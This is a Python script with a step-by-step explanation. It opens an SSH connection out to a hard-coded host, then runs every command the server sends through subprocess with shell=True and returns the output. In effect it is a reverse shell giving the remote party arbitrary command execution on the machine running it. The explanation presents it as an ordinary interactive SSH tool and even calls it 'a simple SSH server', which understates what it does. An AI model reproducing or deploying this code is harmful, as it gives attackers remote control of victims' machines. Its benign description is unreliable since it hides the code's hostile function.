
```python
import subprocess
import paramiko

# Function to establish an SSH connection and execute commands
def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()  # Create an SSHClient instance
    # client can also support using key files
    # client.load_host_keys("/home/user/.ssh/known_host")  # Uncomment to load known host keys for validation
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add the server's host key if not found
    client.connect(ip, username=user, password=passwd)  # Connect to the SSH server using provided credentials
    
    # Open a session over the established SSH transport
    ssh_session = client.get_transport().open_session() 
    
    if ssh_session.active:  # Check if the SSH session is active
        # Send the initial command ("ClientConnected") to the SSH server
        ssh_session.send(command)
        
        # Print the server's response (initial banner or greeting message)
        print(ssh_session.recv(1024))  # Read the first 1024 bytes from the server's response

        while True:
            # Wait for further commands from the SSH server
            command = ssh_session.recv(1024)  # Receive command from the server
            try:
                # Execute the received command locally using subprocess
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                # Send back the command output to the SSH server
                ssh_session.send(cmd_output)
            except Exception as e:
                # In case of an error, send the error message back to the SSH server
                ssh_session.send(str(e))

    client.close()  # Close the SSH connection after finishing
    return

# Call the function with the IP address, username, password, and initial command
ssh_command("192.168.100.130", "justin", "lovesthepython", "ClientConnected")
```

### Explanation:
1. **Importing Modules:**
   - `subprocess`: Allows running shell commands and retrieving the output.
   - `paramiko`: Provides the functionality to create SSH connections and interact with remote systems.

2. **ssh_command Function:**
   - Takes four arguments: `ip` (IP address of the remote host), `user` (username for SSH login), `passwd` (password), and `command` (initial command to send upon connection).
   
3. **SSHClient Setup:**
   - `client = paramiko.SSHClient()`: Creates an instance of `SSHClient` to manage the SSH connection.
   - `client.set_missing_host_key_policy(paramiko.AutoAddPolicy())`: Automatically accepts the server’s host key if it is not already known.
   - `client.connect(ip, username=user, password=passwd)`: Connects to the remote server using the provided IP, username, and password.

4. **Opening an SSH Session:**
   - `ssh_session = client.get_transport().open_session()`: Opens an interactive session over the established SSH transport.
   
5. **Sending and Receiving Data:**
   - `ssh_session.send(command)`: Sends the initial command (`"ClientConnected"`) to the remote server.
   - `print(ssh_session.recv(1024))`: Prints the server’s initial response (banner or greeting message).
   
6. **Continuous Command Execution:**
   - The while loop waits for commands from the SSH server, processes them using `subprocess.check_output()` to execute the received command locally, and sends the output back to the server.
   - If an error occurs while running the command, the exception message is sent back.

7. **Closing the Connection:**
   - `client.close()`: Closes the SSH connection after the operations are completed.

### Key Points:
- The code establishes an SSH connection to a remote host and sends/receives commands and responses interactively.
- The `subprocess.check_output()` method is used to run system commands locally based on the commands received from the server.
- This setup works as a simple SSH server (although it requires an active session to work continuously).
